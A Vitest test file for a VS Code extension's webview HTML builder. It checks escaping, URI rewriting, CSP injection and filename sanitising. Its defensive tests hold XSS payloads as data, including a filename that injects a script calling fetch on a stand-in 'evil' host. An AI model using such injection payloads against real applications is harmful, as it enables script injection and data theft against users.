import { describe, it, expect } from "vitest";
import { buildViewerHtml, jsonForInlineScript } from "../src/webviewHtml";

const TEMPLATE = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="./webview.css">
</head>
<body>
  <script type="module" src="./webview.js"></script>
</body>
</html>`;

const BASE_OPTS = {
  scriptUri: "vscode-resource://ext/dist/webview.js",
  cssUri: "vscode-resource://ext/dist/webview.css",
  fileUrl: "http://127.0.0.1:1234/abc",
  filename: "test.tif",
  cspSource: "vscode-resource://ext",
  serverPort: 1234,
};

describe("jsonForInlineScript", () => {
  it("escapes < so </script> cannot terminate the inline block", () => {
    const out = jsonForInlineScript("</script><script>alert(1)</script>.tif");
    expect(out).not.toContain("</script>");
    expect(out).toContain("\\u003c/script>");
    expect(JSON.parse(out)).toBe("</script><script>alert(1)</script>.tif");
  });
});

describe("buildViewerHtml", () => {
  it("rewrites asset URIs and injects file globals", () => {
    const html = buildViewerHtml(TEMPLATE, BASE_OPTS);
    expect(html).toContain(`src="${BASE_OPTS.scriptUri}"`);
    expect(html).toContain(`href="${BASE_OPTS.cssUri}"`);
    expect(html).toContain(`window.__RASTEREYE_FILE_URL__ = "http://127.0.0.1:1234/abc"`);
    expect(html).toContain("Content-Security-Policy");
    expect(html).not.toContain("unpkg.com");
  });

  it("neutralizes a script-injection filename", () => {
    const html = buildViewerHtml(TEMPLATE, {
      ...BASE_OPTS,
      filename: `x</script><script>fetch("https://evil")</script>.tif`,
    });
    // The only </script> occurrences must be the template's own closers, so
    // the payload never escapes the injected string literal.
    expect(html).not.toContain(`<script>fetch(`);
  });

  it("does not expand $-patterns from the filename", () => {
    const html = buildViewerHtml(TEMPLATE, {
      ...BASE_OPTS,
      filename: "weird$&name$'.tif",
    });
    expect(html).toContain(String.raw`weird$&name$'.tif`);
  });
});
